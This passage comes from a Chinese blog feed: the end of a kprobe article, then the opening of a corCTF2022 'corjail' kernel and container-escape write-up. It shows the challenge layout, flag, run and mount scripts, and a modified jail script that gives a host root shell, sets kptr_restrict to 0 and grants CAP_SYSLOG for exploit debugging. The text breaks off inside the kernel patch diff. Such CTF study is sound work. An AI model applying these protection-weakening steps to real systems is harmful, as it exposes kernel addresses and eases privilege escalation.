title="2.Kprobe工作原理"></a>2.Kprobe工作原理</h3><p>当一个kprobe被注册,Kprobe复制被插桩的指令然后使用一个断点指令来替换该指令的开头几个字节(例如在i386或者说x86_64上的int3中断指令)</p><p>当cpu命中该断点指令时,陷阱触发,cpu的寄存器们就被保存并且控制权通过<code>notifier_call_chain</code>机制传递给Kprobes.Kprobes执行与kprobe所关联的<code>pre_handler</code>,然后将kprobe结构体的地址和保存到的寄存器传递给handler.</p><p>下一步,Kprobes单步执行复制的被插桩的指令,在单步执行指令之后，Kprobes 执行与 kprobe 关联的“post_handler”（如果有）。然后继续执行探测点之后的指令。</p><h1 id="第六章：河狸岩洞"><a href="#第六章：河狸岩洞" class="headerlink" title="第六章：河狸岩洞"></a>第六章：河狸岩洞</h1><p><a href="https://www.kernel.org/doc/html/latest/bpf/index.html">eBPF document</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>kernel</tag>
      
      <tag>source</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>corCTF2022-corjail赛题复现</title>
    <link href="/2024/01/08/corCTF2022-corjail/"/>
    <url>/2024/01/08/corCTF2022-corjail/</url>
    
    <content type="html"><![CDATA[<h1 id="corCTF2022-corjail"><a href="#corCTF2022-corjail" class="headerlink" title="corCTF2022-corjail"></a>corCTF2022-corjail</h1><p>出题人D3V17关于本题的文章在<a href="https://syst3mfailure.io/corjail/">这里</a></p><p>由于这是本人第一次写有关于Linux kernel+Docker escape的题型，所以下面会尽可能详细的写下解题步骤</p><p>首先是给出第一次启动的图，十分的炫酷捏</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8326cffc1e178a82f6fd2794b003738da877e8c5.jpg"></p><h1 id="0x00-题目结构分析"><a href="#0x00-题目结构分析" class="headerlink" title="0x00 题目结构分析"></a>0x00 题目结构分析</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs stylus">./<br>├── README<span class="hljs-selector-class">.md</span><br>└── task<br>    ├── build<br>    │   ├── build_image<span class="hljs-selector-class">.sh</span><br>    │   ├── build_kernel<span class="hljs-selector-class">.sh</span><br>    │   ├── coros<br>    │   │   └── files<br>    │   │       ├── bin<br>    │   │       │   ├── init<br>    │   │       │   └── jail<br>    │   │       ├── config<br>    │   │       │   ├── init<span class="hljs-selector-class">.service</span><br>    │   │       │   ├── motd<br>    │   │       │   └── serial-getty@<span class="hljs-selector-class">.service</span><br>    │   │       ├── docker<br>    │   │       │   ├── Dockerfile<br>    │   │       │   ├── image<br>    │   │       │   │   └── image<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span><br>    │   │       │   └── seccomp<span class="hljs-selector-class">.json</span><br>    │   │       ├── flag<span class="hljs-selector-class">.txt</span><br>    │   │       └── module<br>    │   │           ├── cormon<span class="hljs-selector-class">.ko</span><br>    │   │           ├── modules<span class="hljs-selector-class">.dep</span><br>    │   │           └── modules<span class="hljs-selector-class">.dep</span><span class="hljs-selector-class">.bin</span><br>    │   └── kernel<br>    │       └── patch<br>    ├── chall<br>    │   ├── bzImage<br>    │   ├── cormon<span class="hljs-selector-class">.ko</span><br>    │   ├── run_challenge<span class="hljs-selector-class">.sh</span><br>    │   └── seccomp<span class="hljs-selector-class">.json</span><br>    └── flag-license-website<br>        ├── app<br>        │   ├── app<span class="hljs-selector-class">.py</span><br>        │   ├── encryption<span class="hljs-selector-class">.py</span><br>        │   ├── requirements<span class="hljs-selector-class">.txt</span><br>        │   ├── static<br>        │   │   ├── css<br>        │   │   │   ├── <span class="hljs-number">1</span>d2e0db7bdadca0cdc47367126aadc25<span class="hljs-selector-class">.css</span><br>        │   │   │   ├── <span class="hljs-number">20</span>cc687b2730725b9aac594e2a77819c<span class="hljs-selector-class">.css</span><br>        │   │   │   └── <span class="hljs-number">38</span>ec85f45423ec52e9d1f2f778e847ed<span class="hljs-selector-class">.css</span><br>        │   │   ├── images<br>        │   │   │   ├── <span class="hljs-number">639</span>ea56cc818bb6c6388719b4bdd1c7a<span class="hljs-selector-class">.png</span><br>        │   │   │   ├── <span class="hljs-number">7</span>c6877ac5a9ca7acdcde196ed91c6799<span class="hljs-selector-class">.png</span><br>        │   │   │   ├── bb5851739df3c7426a0686449cb04974<span class="hljs-selector-class">.png</span><br>        │   │   │   ├── d4275f26e6700049f85155adda41c9a1<span class="hljs-selector-class">.jpg</span><br>        │   │   │   └── favicon<span class="hljs-selector-class">.ico</span><br>        │   │   └── js<br>        │   │       └── efbd3bc838f31c807a42211a4bce2cd2<span class="hljs-selector-class">.js</span><br>        │   └── templates<br>        │       ├── index<span class="hljs-selector-class">.html</span><br>        │       ├── result<span class="hljs-selector-class">.html</span><br>        │       └── unlock<span class="hljs-selector-class">.html</span><br>        ├── docker-compose<span class="hljs-selector-class">.yml</span><br>        └── Dockerfile<br><br><span class="hljs-number">18</span> directories, <span class="hljs-number">38</span> files<br><br></code></pre></td></tr></table></figure><p>可以看到文件结构还是十分的复杂，首先我们所要做的事情就是听人劝吃饱饭，先读读 <code>README.md</code></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Solves: <span class="hljs-number">1</span><br><br>Author: D3v17<br><br>Description:<br><br>Containerized environments are <span class="hljs-literal">no</span> longer a safe place.<br>Evil hackers <span class="hljs-keyword">continue</span> <span class="hljs-keyword">to</span> refine their secret techniques <span class="hljs-keyword">to</span> bypass modern kernel protectons.<br>CoRJail, <span class="hljs-keyword">as</span> part <span class="hljs-keyword">of</span> CoROS, <span class="hljs-keyword">is</span> designed <span class="hljs-keyword">to</span> stop them!<br><br>With CoRJail, several dangerous syscalls, like msgsnd/msgrcv, are blocked <span class="hljs-keyword">by</span> custom seccomp filters.<br>Syscall usage <span class="hljs-keyword">is</span> constantly monitored <span class="hljs-keyword">with</span> CoRMon, so <span class="hljs-literal">that</span> kernel exploit patterns can rapidly be detected.<br><br>Try the <span class="hljs-keyword">default</span> CoRMon filter <span class="hljs-keyword">with</span> `cat /proc_rw/cormon` <span class="hljs-keyword">and</span> monitor syscall usage like a boss!<br>Still <span class="hljs-keyword">not</span> satisfied? <span class="hljs-built_in">Set</span> a custom filter <span class="hljs-keyword">with</span> `echo -n <span class="hljs-string">&#x27;sys_msgsnd,sys_msgrcv&#x27;</span> &gt; /proc_rw/cormon`.<br><br>Wanna access all the other CoROS features? Buy a CoR SaaS License <span class="hljs-keyword">for</span> only $<span class="hljs-number">31337.00</span>/mo!<br>Hackers<span class="hljs-string">&#x27; days are numbered!</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Flag: `corctf&#123;C0R_J4!L_H@S_B33N_PWN3D_991cd43a402cda6c&#125;`</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>出题者 <code>D3v17</code>跟 <code>BitsByWill</code>师傅好像经常成对在corctf贡献例题，tql</p><p>话说回来，上面这段话给了我们的信息是可以通过 <code>echo -n &#39;sys_msgsnd,sys_msgrcv&#39; &gt; /proc_rw/cormo</code>来修改我们的 <code>Cormon filter</code>,该过滤器检测了我们使用系统调用的一些简单信息，这在之后我们再来讨论，先说会题目环境的问题</p><p>由于本人在docker领域仍是一个新的不能再新手，所以在看到题目给出的文件结构是十分难绷的</p><p><img src="https://th.bing.com/th/id/OIP.RtOJYZkiuJYKODOPHRjvnAHaEo?pid=ImgDet&w=1005&h=628&rs=1"></p><p>扭头可以看到唯一十分熟悉的是 <code>chall/</code>目录下的文件，这里第一时间查看他的 <code>run_challenge.sh</code></p><p>如下：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#!/bin/sh</span><br>qemu-system-x86_64 <span class="hljs-string">\</span><br>    -m <span class="hljs-number">1</span>G <span class="hljs-string">\</span><br>    -nographic <span class="hljs-string">\</span><br>    -<span class="hljs-literal">no</span>-reboot <span class="hljs-string">\</span><br>    -kernel bzImage <span class="hljs-string">\</span><br>    -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda quiet loglevel=3 rd.systemd.show_status=auto rd.udev.log_level=3 oops=panic panic=-1 net.ifnames=0 pti=on&quot;</span> <span class="hljs-string">\</span><br>    -hda coros.qcow2 <span class="hljs-string">\</span><br>    -snapshot <span class="hljs-string">\</span><br>    -monitor /dev/<span class="hljs-literal">null</span> <span class="hljs-string">\</span><br>    -cpu qemu64,+smep,+smap,+rdrand <span class="hljs-string">\</span><br>    -smp cores=<span class="hljs-number">4</span> <span class="hljs-string">\</span><br>    --enable-kvm<br><br></code></pre></td></tr></table></figure><p>可以看到其中也是使用到了一个拷在硬盘上的文件系统 <code>coros.qcow2</code>，在出题人的github上也说明由于过于庞大所以我们需要自己使用 <code>build/build_image.sh</code>来进行构建，</p><p>同样的我们在 <code>build</code>文件目录下也看到了一个 <code>build_kernel.sh</code>的脚本，可以使用他来编译内核，但在编译的过程当中可能会出现SSL报错问题，并且由于是单核编译所以慢的不能再慢，因此这里给出的解决办法是将编译选项 <code>MODULE_SIG_ALL</code>取消选择即可。</p><p>要查询给定硬盘上的文件系统，我们需要首先将其挂载再我们的某个硬盘设备下，这里给出挂载&#x2F;卸载脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">### mount.bash</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">set</span> -eu<br><br><span class="hljs-attribute">MNTPOINT</span>=/tmp/hoge<br><span class="hljs-attribute">QCOW</span>=$(realpath <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;PWD&#125;</span>&quot;</span>/<span class="hljs-built_in">..</span>/build/coros/coros.qcow2)<br><br>sudo modprobe nbd <span class="hljs-attribute">max_part</span>=8<br>mkdir -p <span class="hljs-variable">$MNTPOINT</span><br>sudo qemu-nbd <span class="hljs-attribute">--connect</span>=/dev/nbd0 <span class="hljs-string">&quot;<span class="hljs-variable">$QCOW</span>&quot;</span><br>sudo fdisk -l /dev/nbd0<br>sudo mount /dev/nbd0 <span class="hljs-variable">$MNTPOINT</span><br><br><span class="hljs-comment">### umount.bash</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">set</span> -eu<br><span class="hljs-attribute">MNTPOINT</span>=/tmp/hoge<br><br>sudo umount <span class="hljs-variable">$MNTPOINT</span> || <span class="hljs-literal">true</span><br>sudo qemu-nbd --disconnect /dev/nbd0<br>sudo rmmod nbd<br></code></pre></td></tr></table></figure><p>我们在挂载的文件系统当中查看 <code>etc/inittab</code>文件，该文件内进行了运行级别的配置</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">T0:</span><span class="hljs-number">23</span><span class="hljs-symbol">:respawn</span><span class="hljs-symbol">:/sbin/getty</span> -L ttyS0 <span class="hljs-number">115200</span> vt100<br></code></pre></td></tr></table></figure><p>然后通过 <code>/etc/systemd/system/init.service</code>来查看 服务进程</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Initialize challenge<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot<br><span class="hljs-attr">ExecStart</span>=/usr/local/bin/init<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>然后我们来看其中的服务条目，查看 <code>ExecStart</code>所对应的 <code>/usr/local/bin/init</code>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>USER=user<br><br>FLAG=$(<span class="hljs-built_in">head</span> -n 100 /dev/urandom | <span class="hljs-built_in">sha512sum</span> | awk <span class="hljs-string">&#x27;&#123;printf $1&#125;&#x27;</span>)<br><br>useradd --create-home --shell /bin/bash <span class="hljs-variable">$USER</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PS1=&#x27;\[\033[01;31m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]# &#x27;&quot;</span>  &gt;&gt; /root/.bashrc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PS1=&#x27;\[\033[01;35m\]\u@CoROS\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;&quot;</span> &gt;&gt; /home/<span class="hljs-variable">$USER</span>/.bashrc<br><br><span class="hljs-built_in">chmod</span> -r 0700 /home/<span class="hljs-variable">$USER</span><br><br><span class="hljs-built_in">mv</span> /root/temp /root/<span class="hljs-variable">$FLAG</span><br><span class="hljs-built_in">chmod</span> 0400 /root/<span class="hljs-variable">$FLAG</span><br></code></pre></td></tr></table></figure><p>其中大概含义是首先创建一个名叫user的普通用户，然后给了我们一个好看的shell提示符:)，之后将flag设置为root权限，在这之后我们查看 <code>etc/passwd</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/usr/local/bin/jail</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>.......<br></code></pre></td></tr></table></figure><p>我们再进一步查看root用户的shell <code>usr/local/bin/jail</code>,如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span><br>/usr/bin/docker run -it --user user --hostname CoRJail --security-opt seccomp=/etc/docker/corjail.json -v /proc/cormon:/proc_rw/cormon:rw corcontainer<br>/usr/sbin/poweroff -f<br><br></code></pre></td></tr></table></figure><p>这里最终发现整体结构是启动了root的 shell后是首先调用 <code>docker</code>来构建了一个容器然后关闭自身，在那之后我们起的虚拟环境就是处于该docker容器当中，这一点搞懂了十分舒畅 :^)</p><p>因此这里我们可以直接修改其中要素，将上面的文件修改为</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#!<span class="hljs-regexp">/bin/</span>bash<br><br>echo -e <span class="hljs-string">&#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;</span><br>#<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker run -itd --user user --hostname CoRJail --security-opt seccomp=/</span>etc<span class="hljs-regexp">/docker/</span>corjail.json -v <span class="hljs-regexp">/proc/</span>cormon:<span class="hljs-regexp">/proc_rw/</span>cormon:rw corcontainer<br><span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">/usr/</span>sbin/poweroff -f<br></code></pre></td></tr></table></figure><p>这样我们就可以将docker容器在后台运行然后得到一个 <strong>真正的本地root权限shell，而并非在docker当中</strong>，在其中我们使用 <code>docker images</code>来查看docker镜像情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9345d688d43f8794b8c7131a941b0ef41bd53acd.jpg"></p><p>我们发现其中有两个容器镜像是在 <code>usr/local/bin/jail</code>之前就已经存在,那么他们是从哪儿来的呢，我们查看 <code>build_image.sh</code>文件，也就是我们获取该文件系统镜像的脚本，其中有一部分如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs build_image.sh"># Copy docker image<br>tar -xzvf coros/files/docker/image/image.tar.gz -C coros/files/docker<br>cp -rp coros/files/docker/var/lib/docker $FS/var/lib/<br>rm -rf coros/files/docker/var                                            <br></code></pre></td></tr></table></figure><p>这里为了方便我们之后漏洞调试的工作，所以我们此时将其启动脚本修改为如下部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs usr/local/bin/jail">#!/bin/bash<br><br>echo -e &#x27;[\033[5m\e[1;33m!\e[0m] Spawning a shell in a CoRJail...&#x27;<br>cp /exploit /home/user || echo &quot;[!] exploit not found, skipping&quot;<br>chown -R user:user /home/user<br>echo 0 &gt; /proc/sys/kernel/kptr_restrict<br>/usr/bin/docker run -it --user root \<br>  --hostname CoRJail \<br>  --security-opt seccomp=/etc/docker/corjail.json \<br>  --add-cap CAP_SYSLOG \<br>  -v /proc/cormon:/proc_rw/cormon:rw \<br>  -v /home/user/:/home/user/host \<br>  corcontainer<br>/usr/sbin/poweroff -f<br></code></pre></td></tr></table></figure><p>下面按照行号来讲解</p><p>第四行，在我们挂载的文件系统当中创建的 <code>exploit</code>文件复制到 <code>home/user</code>文件目录下</p><p>第五行，修改该目录下的用户以及用户组所有权(</p><p>第六行，这里普及一下相关知识，这里主要是查看proc文件的官方手册</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">The value in this file determines whether kernel addresses are exposed via /proc files and other interfaces.   A  value  of  0  in  this file imposes no restrictions.  If the value is 1, kernel pointers printed using the %pK format specifier will be replaced with zeros unless the user  has the  CAP_SYSLOG  capability.   If  the  value is 2, kernel pointers printed using the %pK format specifier will be replaced with zeros regardless of the user&#x27;s capabilities.   The  initial  default  value for this file was 1, but the default was changed to 0 in Linux 2.6.39.  Since Linux 3.4, only users with the CAP_SYS_ADMIN capability can change the value in this file.<br></code></pre></td></tr></table></figure><p>这里不放中文是有可能翻译过来损失了原本的含义，所以这里仅给出原文和个人的见解</p><p>如果该值为0，则不产生任何影响，如果该值为1，则使用 <code>%pK</code>格式化打印的内核指针将会替换为0，在这种情况下用户也可以将所属用户空间的标志位设置有 <code>CAP_SYSLOG</code>来进行绕过。而如果该值为2，则即使用户设置了 <code>CAP_SYSLOG</code>也会将内核指针地址置0.</p><p>第七行，为该容器添加 <code>CAP_SYSLOG</code>用户空间标志</p><p>第十一行，十二行，从根文件系统绑定用户目录到docker容器</p><p>在这之后我们就可以方便的以root来查看我们的符号表，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c8701f8c7f3d2617f9e2f0708ff95.jpg"></p><p>除此之外，smallkirby师傅的博客中推荐了一下其自行实现的一个<a href="https://github.com/smallkirby/lysithea">小工具</a>，它可以更加方便我们的内核环境的相关信息获取虽然本人并没有在本题来使用他，这里先记录一下</p><h1 id="0x01-漏洞模块逆向"><a href="#0x01-漏洞模块逆向" class="headerlink" title="0x01 漏洞模块逆向"></a>0x01 漏洞模块逆向</h1><h2 id="1-杂项"><a href="#1-杂项" class="headerlink" title="1.杂项"></a>1.杂项</h2><p>在题目所给文件当中给出了 <code>build/kernel/patch</code>文件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs diff">diff -ruN a/arch/x86/entry/syscall_64.c b/arch/x86/entry/syscall_64.c<br><span class="hljs-comment">--- a/arch/x86/entry/syscall_64.c2022-06-29 08:59:54.000000000 +0200</span><br><span class="hljs-comment">+++ b/arch/x86/entry/syscall_64.c2022-07-02 12:34:11.237778657 +0200</span><br><span class="hljs-meta">@@ -17,6 +17,9 @@</span><br> <br> #define __SYSCALL_64(nr, sym) [nr] = __x64_##sym,<br> <br><span class="hljs-addition">+DEFINE_PER_CPU(u64 [NR_syscalls], __per_cpu_syscall_count);</span><br><span class="hljs-addition">+EXPORT_PER_CPU_SYMBOL(__per_cpu_syscall_count);</span><br><span class="hljs-addition">+</span><br> asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = &#123;<br> /*<br>  * Smells like a compiler bug -- it doesn&#x27;t work<br>diff -ruN a/arch/x86/include/asm/syscall_wrapper.h b/arch/x86/include/asm/syscall_wrapper.h<br><span class="hljs-comment">--- a/arch/x86/include/asm/syscall_wrapper.h2022-06-29 08:59:54.000000000 +0200</span><br><span class="hljs-comment">+++ b/arch/x86/include/asm/syscall_wrapper.h2022-07-02 12:34:11.237778657 +0200</span><br><span class="hljs-meta">@@ -245,7 +245,7 @@</span><br>  * SYSCALL_DEFINEx() -- which is essential for the COND_SYSCALL() and SYS_NI()<br>  * macros to work correctly.<br>  */<br><span class="hljs-deletion">-#define SYSCALL_DEFINE0(sname)\</span><br><span class="hljs-addition">+#define __SYSCALL_DEFINE0(sname)\</span><br> SYSCALL_METADATA(_##sname, 0);\<br> static long __do_sys_##sname(const struct pt_regs *__unused);\<br> __X64_SYS_STUB0(sname)\<br>diff -ruN a/include/linux/syscalls.h b/include/linux/syscalls.h<br><span class="hljs-comment">--- a/include/linux/syscalls.h2022-06-29 08:59:54.000000000 +0200</span><br><span class="hljs-comment">+++ b/include/linux/syscalls.h2022-07-02 12:34:11.237778657 +0200</span><br><span class="hljs-meta">@@ -82,6 +82,7 @@</span><br> #include &lt;linux/key.h&gt;<br> #include &lt;linux/personality.h&gt;<br> #include &lt;trace/syscall.h&gt;<br><span class="hljs-addition">+#include &lt;asm/syscall.h&gt;</span><br> <br> #ifdef CONFIG_ARCH_HAS_SYSCALL_WRAPPER<br> /*<br><span class="hljs-meta">@@ -202,8 +203,8 @@</span><br> &#125;<br> #endif<br> <br><span class="hljs-deletion">-#ifndef SYSCALL_DEFINE0</span><br><span class="hljs-deletion">-#define SYSCALL_DEFINE0(sname)\</span><br><span class="hljs-addition">+#ifndef __SYSCALL_DEFINE0</span><br><span class="hljs-addition">+#define __SYSCALL_DEFINE0(sname)\</span><br> SYSCALL_METADATA(_##sname, 0);\<br> asmlinkage long sys_##sname(void);\<br> ALLOW_ERROR_INJECTION(sys_##sname, ERRNO);\<br><span class="hljs-meta">@@ -219,9 +220,41 @@</span><br> <br> #define SYSCALL_DEFINE_MAXARGS6<br> <br><span class="hljs-deletion">-#define SYSCALL_DEFINEx(x, sname, ...)\</span><br><span class="hljs-deletion">-SYSCALL_METADATA(sname, x, __VA_ARGS__)\</span><br><span class="hljs-deletion">-__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)</span><br><span class="hljs-addition">+DECLARE_PER_CPU(u64[], __per_cpu_syscall_count);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_DECLAREx(sname, x, ...) \</span><br><span class="hljs-addition">+static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__));</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define __SYSCALL_COUNT(syscall_nr) \</span><br><span class="hljs-addition">+this_cpu_inc(__per_cpu_syscall_count[(syscall_nr)])</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_FUNCx(sname, x, ...)\</span><br><span class="hljs-addition">+&#123;\</span><br><span class="hljs-addition">+__SYSCALL_COUNT(__syscall_meta_##sname.syscall_nr);\</span><br><span class="hljs-addition">+return __count_sys##sname(__MAP(x, __SC_CAST, __VA_ARGS__));\</span><br><span class="hljs-addition">+&#125;\</span><br><span class="hljs-addition">+static inline long __count_sys##sname(__MAP(x, __SC_DECL, __VA_ARGS__))</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_DECLARE0(sname) \</span><br><span class="hljs-addition">+static inline long __count_sys_##sname(void);</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+#define SYSCALL_COUNT_FUNC0(sname)\</span><br><span 